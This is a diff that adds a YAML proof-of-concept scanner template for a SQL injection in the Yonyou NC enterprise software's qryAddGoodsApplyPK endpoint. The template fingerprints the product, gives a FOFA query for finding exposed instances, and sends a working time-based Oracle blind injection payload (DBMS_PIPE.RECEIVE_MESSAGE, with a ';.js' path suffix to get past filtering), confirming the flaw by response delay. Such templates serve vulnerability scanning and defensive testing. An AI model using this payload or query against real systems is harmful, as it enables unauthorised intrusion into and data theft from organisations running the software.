@@ -1,0 +1,27 @@
+id: poc-yaml-yongyou-nc-qryaddgoodsapplypk-sqli
+info:
+  name: 用友NC-qryAddGoodsApplyPK-SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"<title>YONYOU NC</title>")
+- method: GET
+  path: /ebvp/other/qryAddGoodsApplyPK;.js?billno=1%27+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),{{.t1}})+AND+%27ldrk%27%3d%27ldrk
+  expression: 'status_code == 200
+
+    && body == "" &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
